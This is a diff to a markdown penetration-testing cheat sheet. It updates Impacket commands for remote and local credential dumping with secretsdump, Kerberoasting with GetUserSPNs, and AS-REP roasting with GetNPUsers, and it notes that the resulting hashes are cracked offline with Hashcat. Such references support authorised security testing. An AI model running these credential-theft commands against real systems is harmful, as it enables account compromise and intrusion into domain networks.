@@ -96,12 +96,12 @@ smbexec.py user:password@TARGET_IP
 - Admin credentials
 ### **Remote dump**
 ```bash
-secretsdump.py user:password@TARGET_IP
+impacket-secretsdump user:password@TARGET_IP
 ```
 
 ### **Local dump**
 ```bash
-secretsdump.py -sam sam -system system LOCAL
+impacket-secretsdump -sam sam -system system LOCAL
 ```
 
 ### **Output**
@@ -118,20 +118,18 @@ secretsdump.py -sam sam -system system LOCAL
 - Domain controller reachable
 
 ```bash
-GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
+impacket-GetUserSPNs <domain>/user:password -dc-ip <DC_IP> -request
 ```
 ### **Output**
 - Kerberos hashes
 - Crack offline with Hashcat
 
 ## **GetNPUsers.py — AS-REP Roasting**
-### **When to Use**
-
 - Usernames only
 - Pre-auth disabled accounts
 ### **Command**
 ```bash
-GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP
+impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP>
 ```
 
 ### **Output**
